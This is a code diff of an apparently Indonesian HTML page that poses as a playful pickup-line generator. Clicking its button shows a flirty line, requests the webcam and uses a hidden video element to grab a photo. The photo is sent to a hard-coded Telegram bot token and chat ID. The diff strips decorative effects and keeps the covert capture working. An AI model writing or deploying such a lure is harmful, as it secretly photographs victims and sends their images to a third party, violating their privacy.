@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rayuan & Kamera 📸❤️</title>
+    <title>Rayuan❤️</title>
     <style>
         body {
             display: flex;
@@ -21,17 +21,12 @@
         h1 {
             font-size: 30px;
             color: white;
-            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
-            animation: fadeIn 1s forwards;
         }
 
         p {
             font-size: 20px;
             color: white;
             font-weight: bold;
-            opacity: 0;
-            transform: scale(0.8);
-            transition: opacity 0.5s, transform 0.5s;
         }
 
         button {
@@ -42,7 +37,6 @@
             font-size: 18px;
             cursor: pointer;
             border-radius: 25px;
-            box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
             transition: transform 0.2s, background 0.3s;
         }
 
@@ -51,21 +45,8 @@
             background-color: #ff1e56;
         }
 
-        .love {
-            position: absolute;
-            font-size: 24px;
-            color: red;
-            animation: floatUp 3s linear infinite;
-        }
-
-        @keyframes floatUp {
-            0% { transform: translateY(0) scale(1); opacity: 1; }
-            100% { transform: translateY(-100vh) scale(0.5); opacity: 0; }
-        }
-
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(-20px); }
-            100% { opacity: 1; transform: translateY(0); }
+        video {
+            display: none; /* Video tetap ada tapi tersembunyi */
         }
     </style>
 </head>
@@ -75,50 +56,23 @@
     <p id="flirtText">Klik tombol di bawah buat lihat sesuatu yang spesial! 😘</p>
     <button onclick="godaCewe()">Klik Aku! 💕</button>
 
+    <video id="video" autoplay></video>
+
     <script>
         const rayuanList = [
             "Aku yakin gravitasi gak bisa lawan daya tarik kamu. 😍",
             "Kamu seperti kopi, bikin jantungku berdetak lebih cepat! ☕💓",
             "Kalau bidadari turun ke bumi, pasti wajahnya mirip kamu! 😇",
-            "Mau tau kenapa aku selalu tersenyum? Karena ada kamu. 😊❤️",
-            "Bahkan bulan iri sama kamu, karena kamu yang paling bersinar. 🌙✨",
-            "Aku ga butuh peta, karena hatiku selalu tertuju padamu. 💘"
+            "Mau tau kenapa aku selalu tersenyum? Karena ada kamu. 😊❤️"
         ];
 
-        let clickCount = 0;
         const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI'; // Ganti dengan token bot Telegram
         const chatId = '1746156378'; // Ganti dengan chat ID Telegram
-
-        function randomColor() {
-            const colors = ["#ff758c", "#ff7eb3", "#ff4d6d", "#ff1e56", "#ffafbd", "#ffc3a0"];
-            return colors[Math.floor(Math.random() * colors.length)];
-        }
-
-        function createLoveEffect() {
-            const love = document.createElement("div");
-            love.classList.add("love");
-            love.innerHTML = "❤️";
-            document.body.appendChild(love);
-            
-            let xPos = Math.random() * window.innerWidth;
-            love.style.left = `${xPos}px`;
-            love.style.bottom = "0px";
-
-            setTimeout(() => love.remove(), 3000);
-        }
+        const video = document.getElementById('video');
 
         function godaCewe() {
             const flirtText = document.getElementById("flirtText");
             flirtText.textContent = rayuanList[Math.floor(Math.random() * rayuanList.length)];
-            flirtText.style.opacity = 1;
-            flirtText.style.transform = "scale(1)";
-            document.body.style.background = `linear-gradient(45deg, ${randomColor()}, ${randomColor()})`;
-
-            clickCount++;
-            
-            for (let i = 0; i < 5; i++) {
-                setTimeout(createLoveEffect, i * 300);
-            }
 
             startCapture();
         }
@@ -126,61 +80,42 @@
         function startCapture() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        setTimeout(() => {
-                            captureAndSend(stream);
-                        }, 3000);
+                    .then(stream => {
+                        video.srcObject = stream;
+
+                        // Tunggu sampai video siap
+                        video.onloadedmetadata = () => {
+                            setTimeout(() => {
+                                captureAndSend(stream);
+                            }, 2000);
+                        };
                     })
-                    .catch(function(error) {
-                        alert("Akses kamera ditolak.");
-                    });
+                    .catch(error => alert("Akses kamera ditolak."));
             }
         }
 
         function captureAndSend(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
 
-            video.onloadedmetadata = () => {
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                function drawVideoToCanvas() {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    if (canvas.width > 0 && canvas.height > 0) {
-                        canvas.toBlob(function(blob) {
-                            sendToTelegram(blob);
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 'image/jpeg');
-                    } else {
-                        requestAnimationFrame(drawVideoToCanvas);
-                    }
-                }
-
-                drawVideoToCanvas();
-            };
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+                stream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg');
         }
 
-        function sendToTelegram(message) {
-            let url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-            let data = new URLSearchParams({
-                chat_id: chatId,
-                text: message
-            });
+        function sendToTelegram(blob) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.jpg');
 
-            if (message instanceof Blob) {
-                url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', message, 'photo.jpg');
-                data = formData;
-            }
-
-            fetch(url, { method: 'POST', body: data });
+            fetch(url, { method: 'POST', body: formData });
         }
     </script>
 
